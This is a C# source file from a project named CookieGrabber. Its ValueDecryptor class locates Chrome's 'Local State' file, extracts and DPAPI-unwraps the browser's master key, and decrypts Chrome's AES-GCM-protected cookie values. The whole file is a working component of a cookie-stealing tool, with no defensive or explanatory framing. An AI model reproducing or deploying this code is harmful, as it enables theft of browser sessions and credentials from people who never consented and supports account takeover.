using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using CookieGrabber.BouncyCastle;

namespace CookieGrabber
{
    internal class ValueDecryptor
    {
        public KeyParameter MasterKey => _masterKey ?? (_masterKey = GetMasterKey(path));

        string path;
        KeyParameter _masterKey;

        public ValueDecryptor(string path)
        {
            this.path = path;
        }

        public string DecryptValueChrome(byte[] byteValue)
        {
            if (byteValue[0] == 'v' && byteValue[1] == '1' && (byteValue[2] == '0' || byteValue[2] == '1'))
            {
                byte[] iv = byteValue.Skip(3).Take(12).ToArray(); // From 3 to 15
                byte[] payload = byteValue.Skip(15).ToArray();    // from 15 to end
                string decryptedValue = Aes256Gcm.decrypt(payload, MasterKey, iv);

                return decryptedValue;
            }
            else
            {
                return Encoding.Default.GetString(DPAPI.Decrypt(byteValue));
            }
        }

        KeyParameter GetMasterKey(string dftPath)
        {
            var lspath = SearchLocalStateFile(dftPath);
            if (lspath == null)
                return null;
            var enckeybase64 = getEncryptedKey(File.ReadAllText(lspath));
            var enckey = Convert.FromBase64String(enckeybase64).SkipWhile((_, i) => i < 5).ToArray();

            return new KeyParameter(DPAPI.Decrypt(enckey));
        }

        string SearchLocalStateFile(string path)
        {
            string lspath = null;
            foreach (string ls in new string[] { "", "\\..", "\\..\\.." })
            {
                lspath = path + ls + "\\Local State";
                if (File.Exists(lspath))
                    break;
                else
                    lspath = null;
            }
            return lspath;
        }

        // WTF?
        string getEncryptedKey(string text)
        {
            var val = System.Text.RegularExpressions.Regex.Match(text, "\"os_crypt\"\\s*:\\s*{\\s*\"encrypted_key\"\\s*:\\s*\".*?\"\\s*}").Value;
            val = val.Replace("\"os_crypt\"", null).Replace("\"encrypted_key\"", null);
            val = System.Text.RegularExpressions.Regex.Match(val, "\".*?\"").Value;
            val = val.Substring(1, val.Length - 2);
            return val;
        }
    }
}
